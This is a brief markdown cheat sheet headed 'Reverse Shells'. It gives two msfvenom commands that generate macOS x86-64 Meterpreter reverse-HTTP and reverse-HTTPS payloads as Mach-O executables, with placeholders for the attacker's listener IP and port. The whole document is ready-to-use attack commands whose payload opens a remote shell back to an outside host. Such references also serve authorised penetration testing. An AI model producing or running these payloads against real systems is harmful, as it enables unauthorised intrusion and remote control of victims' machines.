# Reverse Shells

1. x86-64 (64-bit) Payloads

```
$ msfvenom -p osx/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f macho -o met-x64

$ msfvenom -p osx/x64/meterpreter_reverse_https handlersslcert=<file.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f macho -o met-x64
```